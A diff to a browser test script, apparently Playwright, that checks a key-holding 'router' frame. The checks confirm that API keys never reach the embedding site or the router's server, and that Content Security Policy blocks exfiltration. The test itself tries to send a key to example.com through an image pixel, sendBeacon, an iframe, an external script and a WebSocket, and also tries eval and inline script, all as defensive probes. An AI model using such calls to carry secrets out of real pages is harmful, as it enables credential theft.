@@ -10,6 +10,9 @@ const ctx = await browser.newContext();
 // The pages ask for web fonts. The tests do not wait on another network for them.
 await ctx.route(/^https:\/\/fonts\.(googleapis|gstatic)\.com\//, (route) => route.abort());
 const errors = [];
+// Everything that is sent to the router's own server, to look for a key in it afterwards.
+const toServer = [];
+ctx.on("request", (request) => { if (new URL(request.url()).host === new URL(base("router")).host) toServer.push(request.method() + " " + request.url() + " " + (request.postData() || "")); });
 ctx.on("page", (p) => { p.on("pageerror", (e) => errors.push(`${p.url()}: ${e.message}`)); });
 let failed = 0;
 const check = (name, ok, extra = "") => { console.log(`${ok ? "ok  " : "FAIL"} ${name}${extra ? " " + extra : ""}`); if (!ok) failed++; };
@@ -144,6 +147,14 @@ const leak = await florist.evaluate((key) => {
 }, KEY);
 check("no message the site received contains the key", !leak.heard && leak.heardAny > 3, `(${leak.heardAny} messages checked)`);
 check("the site's own storage does not contain the key", !leak.store);
+// The grant goes from the router window to the router frame on a port the window makes. The site
+// embeds the frame and opens the window, and holds no end of that port. So it hears none of it.
+const heard = await florist.evaluate(() => {
+  const all = window.__heard.map((text) => { try { return JSON.parse(text); } catch { return null; } }).filter(Boolean);
+  const kinds = [...new Set(all.map((m) => (m.router ? "router:" + m.router : m.t ? "t:" + m.t : "other")))].sort();
+  return { kinds, handover: window.__heard.filter((text) => /"router":"picker"|"t":"grant"|"t":"site"|"t":"stored"|"sealed"|"wrap"|"secret"/.test(text)).length };
+});
+check("the site heard nothing of the handover between the window and the frame", heard.handover === 0 && heard.kinds.includes("router:frame-ready") && heard.kinds.includes("t:state") && heard.kinds.includes("t:text"), "it heard only: " + heard.kinds.join(", "));
 check("the site cannot read the frame's storage", leak.reach === "blocked");
 const frame = florist.frames().find((f) => f.url().includes("/frame.html"));
 const kept = await frame.evaluate(() => JSON.stringify({ ...localStorage }));
@@ -171,6 +182,37 @@ check("the page that calls the provider cannot connect to any other address at t
   && (await tryFetch(callPage, "https://api.anthropic.com/")) === "blocked" && seen.length === before);
 check("the page that calls the provider cannot connect to another provider", (await tryFetch(callPage, "https://api.openai.com/v1/models")) === "blocked");
 check("the page that calls the provider cannot connect to another address", (await tryFetch(callPage, "https://example.com/")) === "blocked");
+// Things a page could be talked into doing to carry a key out. Each is stopped by its policy.
+const tried = await callPage.evaluate(async () => {
+  // The browser reports each thing its policy stops. One attempt at a time, with a pause
+  // after it, so that a report is counted against the attempt that caused it.
+  const refused = async (work) => {
+    const result = await new Promise((resolve) => {
+      const heard = (event) => { document.removeEventListener("securitypolicyviolation", heard); resolve(event.effectiveDirective); };
+      document.addEventListener("securitypolicyviolation", heard);
+      setTimeout(() => { document.removeEventListener("securitypolicyviolation", heard); resolve("allowed"); }, 1500);
+      try { work(); } catch { /* the report says why */ }
+    });
+    await new Promise((resolve) => setTimeout(resolve, 150));
+    return result;
+  };
+  return {
+    // Asked for from a timer: code run straight from the test's own tools is let through, as it is from DevTools.
+    eval: await refused(() => { setTimeout(() => { try { new Function("return 1")(); window.__evaled = true; } catch { /* the report says why */ } }, 0); }),
+    evaled: window.__evaled === true,
+    inline: await refused(() => { const script = document.createElement("script"); script.textContent = "window.__ran = true"; document.head.append(script); }),
+    ran: window.__ran === true,
+    image: await refused(() => { new Image().src = "https://example.com/pixel.png?key=x"; }),
+    style: await refused(() => { const link = document.createElement("link"); link.rel = "stylesheet"; link.href = "https://fonts.googleapis.com/css2?family=x"; document.head.append(link); }),
+    frame: await refused(() => { const frame = document.createElement("iframe"); frame.src = "https://example.com/?key=x"; document.documentElement.append(frame); }),
+    script: await refused(() => { const script = document.createElement("script"); script.src = "https://example.com/x.js"; document.head.append(script); }),
+    beacon: await refused(() => { navigator.sendBeacon("https://example.com/?key=x", "x"); }),
+    socket: await refused(() => { new WebSocket("wss://example.com/"); }),
+  };
+});
+check("the call page cannot be made to run other code: no eval, no script written in, no script from elsewhere", /^script-src/.test(tried.eval) && !tried.evaled && /^script-src/.test(tried.inline) && !tried.ran && /^script-src/.test(tried.script), JSON.stringify(tried));
+check("the call page cannot carry a key out in an image, a style sheet, a frame, a beacon or a socket", /^img-src/.test(tried.image) && /^style-src/.test(tried.style) && /^(frame-src|child-src)/.test(tried.frame) && /^connect-src/.test(tried.beacon) && /^connect-src/.test(tried.socket), JSON.stringify(tried));
+check("the router frame around it has no styles, fonts or images to load from anywhere, and cannot hold a frame from another site", !/style-src|font-src|img-src|https?:/.test(csp) && /frame-src 'self'/.test(csp), csp);
 check("the page that calls the provider cannot connect to the router's server", (await tryFetch(callPage, "/_sites.js")) === "blocked");
 check("the site's requests go through a worker inside the frame", florist.workers().some((w) => w.url().endsWith("/frame-worker.js")));
 
@@ -334,6 +376,8 @@ const outside = await florist.evaluate(async (router) => {
 }, base("router"));
 check("another origin cannot call the router's grant list", outside === "blocked" || outside === 403, String(outside));
 
+const serverCalls = toServer.filter((line) => line.includes("/r/"));
+check("the router's server was never sent an API key, in the clear or encrypted", serverCalls.length > 20 && !toServer.some((line) => line.includes(KEY) || line.includes(KEY2) || /sealed|"key"|"iv"/.test(line)), `${serverCalls.length} requests to the server checked, of ${toServer.length} to the router's address`);
 check("no page threw an error", errors.length === 0, errors.join(" ; "));
 await browser.close();
 console.log(failed ? `\n${failed} failed` : "\nall passed");
